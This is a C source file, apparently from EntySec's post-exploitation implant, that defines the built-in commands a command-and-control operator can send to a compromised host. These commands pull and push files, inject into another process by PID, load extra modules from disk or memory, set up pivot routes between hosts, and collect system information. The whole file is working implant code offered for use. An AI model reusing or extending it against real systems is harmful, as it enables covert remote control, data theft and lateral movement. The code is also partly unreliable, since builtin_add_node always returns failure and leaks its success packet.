/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <sigar.h>

#include <api.h>
#include <c2.h>
#include <node.h>
#include <tab.h>
#include <migrate.h>
#include <tlv_types.h>
#include <tlv.h>

#define BUILTIN_BASE 1

#define BUILTIN_QUIT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL)
#define BUILTIN_ADD_NODE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 1)
#define BUILTIN_DELETE_NODE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 2)
#define BUILTIN_ADD_TAB_DISK \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 3)
#define BUILTIN_ADD_TAB_BUFFER \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 4)
#define BUILTIN_DELETE_TAB \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 5)
#define BUILTIN_MIGRATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 6)
#define BUILTIN_PULL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 7)
#define BUILTIN_PUSH \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 8)
#define BUILTIN_SYSINFO \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       BUILTIN_BASE, \
                       API_CALL + 9)

#define TLV_TYPE_PLATFORM TLV_TYPE_CUSTOM(TLV_TYPE_STRING, API_TYPE)
#define TLV_TYPE_VERSION  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, API_TYPE + 1)
#define TLV_TYPE_ARCH     TLV_TYPE_CUSTOM(TLV_TYPE_STRING, API_TYPE + 2)
#define TLV_TYPE_MACHINE  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, API_TYPE + 3)
#define TLV_TYPE_VENDOR   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, API_TYPE + 4)

static tlv_pkt_t *builtin_quit(c2_t *c2)
{
    return api_craft_tlv_pkt(API_CALL_QUIT);
}

static tlv_pkt_t *builtin_add_node(c2_t *c2)
{
    ipv4_t src_host;
    ipv4_t dst_host;
    port_t src_port;
    port_t dst_port;

    tlv_pkt_t *result;

    tlv_pkt_get_uint(c2->tlv_pkt, TLV_TYPE_NODE_SRC_ADDR, &src_host);
    tlv_pkt_get_ushort(c2->tlv_pkt, TLV_TYPE_NODE_SRC_PORT, &src_port);
    tlv_pkt_get_uint(c2->tlv_pkt, TLV_TYPE_NODE_DST_ADDR, &dst_host);
    tlv_pkt_get_ushort(c2->tlv_pkt, TLV_TYPE_NODE_DST_PORT, &dst_port);

    if (node_add(&c2->dynamic.nodes, c2->dynamic.n_count, \
        src_host, src_port, dst_host, dst_port) >= 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS);
        tlv_pkt_add_int(result, TLV_TYPE_NODE_ID, c2->dynamic.n_count);
        c2->dynamic.n_count++;
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_delete_node(c2_t *c2)
{
    int node_id;

    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_NODE_ID, &node_id);

    if (node_delete(&c2->dynamic.nodes, node_id) >= 0)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_add_tab_disk(c2_t *c2)
{
    char filename[128];
    tlv_pkt_t *result;

    if (tlv_pkt_get_string(c2->tlv_pkt, TLV_TYPE_FILENAME, filename) >= 0)
    {
        if (tab_add_disk(&c2->dynamic.tabs, c2->dynamic.t_count, filename) >= 0)
        {
            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
            tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
            c2->dynamic.t_count++;

            return result;
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
{
    int tab_size;
    unsigned char *tab;
    tlv_pkt_t *result;

    if ((tab_size = tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_TAB, &tab)) >= 0)
    {
        if (tab_add_buffer(&c2->dynamic.tabs, c2->dynamic.t_count, tab, tab_size) >= 0)
        {
            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
            tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
            c2->dynamic.t_count++;
            free(tab);

            return result;
        }
        else
        {
            free(tab);
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
{
    int tab_id;

    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_TAB_ID, &tab_id);

    if (tab_delete(&c2->dynamic.tabs, tab_id) >= 0)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_migrate(c2_t *c2)
{
    int migrate_size;
    unsigned char *migrate;
    pid_t migrate_pid;

    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_PID, &migrate_pid);

    if ((migrate_size = tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_MIGRATE, &migrate)) >= 0)
    {
        if (migrate_init(migrate_pid, migrate_size, migrate) >= 0)
        {
            free(migrate);
            return api_craft_tlv_pkt(API_CALL_QUIT);
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_pull(c2_t *c2)
{
    FILE *file;
    char filename[128];
    int status;

    tlv_pkt_get_string(c2->tlv_pkt, TLV_TYPE_STRING, filename);
    file = fopen(filename, "rb");

    status = API_CALL_FAIL;

    if (c2_write_file(c2, file) >= 0)
    {
        status = API_CALL_SUCCESS;
    }

    if (file != NULL)
    {
        fclose(file);
    }

    return api_craft_tlv_pkt(status);
}

static tlv_pkt_t *builtin_push(c2_t *c2)
{
    FILE *file;
    char filename[128];
    int status;

    tlv_pkt_get_string(c2->tlv_pkt, TLV_TYPE_STRING, filename);
    file = fopen(filename, "wb");

    status = API_CALL_FAIL;

    if (c2_read_file(c2, file) >= 0)
    {
        status = API_CALL_SUCCESS;
    }

    if (file != NULL)
    {
        fclose(file);
    }

    return api_craft_tlv_pkt(status);
}

static tlv_pkt_t *builtin_sysinfo(c2_t *c2)
{
    int status;
    tlv_pkt_t *result;
    sigar_sys_info_t sysinfo;

    if ((status = sigar_sys_info_get(c2->sigar, &sysinfo)) != SIGAR_OK)
    {
        log_debug("* Failed to sigar sysinfo (%s)\n",
                  sigar_strerror(c2->sigar, status));
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    tlv_pkt_add_string(result, TLV_TYPE_PLATFORM, sysinfo.name);
    tlv_pkt_add_string(result, TLV_TYPE_VERSION, sysinfo.version);
    tlv_pkt_add_string(result, TLV_TYPE_ARCH, sysinfo.arch);
    tlv_pkt_add_string(result, TLV_TYPE_MACHINE, sysinfo.machine);
    tlv_pkt_add_string(result, TLV_TYPE_VENDOR, sysinfo.vendor);

    return result;
}

void register_builtin_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, BUILTIN_QUIT, builtin_quit);
    api_call_register(api_calls, BUILTIN_ADD_NODE, builtin_add_node);
    api_call_register(api_calls, BUILTIN_DELETE_NODE, builtin_delete_node);
    api_call_register(api_calls, BUILTIN_ADD_TAB_DISK, builtin_add_tab_disk);
    api_call_register(api_calls, BUILTIN_ADD_TAB_BUFFER, builtin_add_tab_buffer);
    api_call_register(api_calls, BUILTIN_DELETE_TAB, builtin_delete_tab);
    api_call_register(api_calls, BUILTIN_MIGRATE, builtin_migrate);
    api_call_register(api_calls, BUILTIN_PULL, builtin_pull);
    api_call_register(api_calls, BUILTIN_PUSH, builtin_push);
    api_call_register(api_calls, BUILTIN_SYSINFO, builtin_sysinfo);
}